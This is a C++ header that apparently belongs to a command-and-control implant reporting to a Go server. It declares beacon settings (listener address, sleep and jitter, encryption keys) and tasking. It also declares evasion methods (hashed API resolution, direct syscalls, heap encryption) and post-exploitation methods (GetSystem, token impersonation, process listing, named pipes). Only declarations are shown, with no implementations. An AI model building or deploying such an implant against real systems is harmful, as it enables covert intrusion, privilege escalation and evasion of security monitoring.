#pragma once
#include "Syscalls.hpp"
#include <future>
#include <string>
#include <atomic>
#include <memory>

// Forward declarations

class SecureString;
class SecureWideString;
struct SecureTask;
template<typename T> class SecureVector;

// Structures

struct ModuleDetails {
    DWORD CryptedHash;
    PVOID BaseAddress;
    PIMAGE_DOS_HEADER ImageDosHeader;
    PIMAGE_NT_HEADERS ImageNtHeader;
    PIMAGE_EXPORT_DIRECTORY ImageExportDirectory;
};

// Macros

#define InitializeTimerMs(ft, sec)                                        \
    {                                                                     \
        ULONGLONG _tmp = (ULONGLONG)-((sec) * 1000 * 10 * 1000);          \
        (ft)->HighPart = (DWORD)(_tmp >> 32);                             \
        (ft)->LowPart = (DWORD)(_tmp & 0xFFFFFFFF);                       \
    }

class Instance {
public:
    static Instance& Get() {
        static Instance instance; // Guaranteed to be destroyed and instantiated on first use.
        return instance;
    }

    // Public members
    static HANDLE Process;
    static DWORD ProcessId;
    static HANDLE Thread;    
    static DWORD ThreadId;
    static NTSTATUS NtStatus;
    static SecureString Name;
    // Assuming Go server is 64-bit
    static int64_t ID;
    static int64_t ListenerID;
    static int64_t Sleep;
    static int64_t Jitter;
    static int64_t SleepWithJitter;
    static int64_t Spoof;
    static SecureString IP;
    static SecureString ListenerIP;
    static SecureWideString WListenerIP;
    static SecureString Port;    
    static SecureVector<unsigned char> AesKey;
    static SecureVector<unsigned char> IV;
    static SecureVector<unsigned char> XorKey;    
    static SecureWideString UserAgent;
    static bool SSL;
    static bool HeapEncrypt;
    static SecureString Username;
    static SecureString MachineName;
    static SecureString OperatingSystem;
    static SecureString IntegrityLevel;    
    static int MaxRetries;
    static int ErrorCount;

    // Public methods
    static void PopulateVariables();
    template <typename T>
    static void removeElementFromArray(T* array, size_t size, size_t indexToRemove) {
        if (indexToRemove < size) {
            for (size_t i = indexToRemove; i < size - 1; ++i) {
                array[i] = array[i + 1];
            }
        }
        // Optional: Set the last element to a default value, as it's now a duplicate
        array[size - 1] = T(); // Assuming a default constructor is available
    }
    static ModuleDetails GetModuleDetails(DWORD dwCryptedHash);
    static NT_TIB* GetTib();
    static void PrepareSleepTime();
    static int memcmp(const void* ptr1, const void* ptr2, size_t num);
    static void* memcpy(void* dest, const void* src, size_t num);
    static SecureString FormatNtStatus(const SecureString& message, NTSTATUS ntStatus);
    static SecureString FormatLastError(const SecureString& message);
    static SecureString FormatErrorMessage(const SecureString& message);
    static DWORD StringToDWORD(const SecureString& str);
    static void Register();
    static void ExecuteTasks();
    static HANDLE DuplicateHandleNative(HANDLE SourceProcessHandle, HANDLE TargetProcessHandle, HANDLE TargetHandle, ACCESS_MASK DesiredAccess);
    static DWORD GetProcessIdFromHandle(HANDLE ProcessHandle);
    static DWORD GetThreadIdFromHandle(HANDLE ThreadHandle);    
    static unsigned char* StringToUnsignedChar(const SecureString& str);
    static void LogError(SecureString message);    
    static void StartSleep();
    static HANDLE CreateTimerNative(PCWSTR wTimerName);
    static void SetTimerNative(HANDLE hTimer, LARGE_INTEGER TimerDueTime, PTIMER_APC_ROUTINE TimerApcRoutine, PVOID TimerContext);
    // Task methods
    static void GetSystem();
    static void Impersonate(DWORD pid);
    static void CALLBACK ListProcesses(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    static void CALLBACK PipeProc(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

    // Delete copy/move constructors and assignment operators
    Instance(Instance const&) = delete;
    void operator=(Instance const&) = delete;
    Instance(Instance&&) = delete;
    void operator=(Instance&&) = delete;

private:
    Instance();

    // Private methods
    static void PrepareKey();
    static void SetDebug();    
    static void GetUsername();
    static void GetMachineName();
    static void GetOSVersion();
    static void GetIntegrityLevel();
    static std::vector<SecureTask> ParseTasks(const SecureString& json);
    static std::vector<SecureTask> RetrieveTasks();    
    static SecureString JoinArguments(const std::vector<std::unique_ptr<SecureString>>& arguments);
    static bool IsValidUTF8(const SecureString& str);
    static std::unique_ptr<SecureString> SanitizeUTF8(const SecureString& str);
};
